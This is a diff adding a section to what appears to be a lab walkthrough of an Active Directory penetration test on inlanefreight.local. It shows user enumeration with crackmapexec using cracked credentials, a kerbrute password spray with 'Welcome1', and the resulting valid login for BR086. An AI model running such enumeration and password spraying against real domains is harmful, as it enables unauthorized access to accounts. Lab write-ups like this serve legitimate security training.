@@ -186,3 +186,27 @@ sudo responder -I ens224 -v
 
 After cracking it, we obtain the credentials `ab920/weasal` and try evil-winrm. We can connect to the 172.16.7.50 MS01 host.
 
+#### Next User
+
+Now, in order to discover another user, we have to do **password spray** to valid users.&#x20;
+
+So first, we need to discover valid users, and save them to a file:
+
+```
+sudo crackmapexec smb 172.16.7.3 -u ab920 -p weasal --users | awk -F'\\' '{split($2, a, " "); print a[1]}' > valid_users.txt
+```
+
+And once we have it, let's user kerbrute (With the password **Welcome1** because is on the examples)
+
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
+```
+
+And we discover one valid user:
+
+```
+023/10/25 14:07:58 >  [+] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
+```
+
+**BR086  /  Welcome1**&#x20;
+
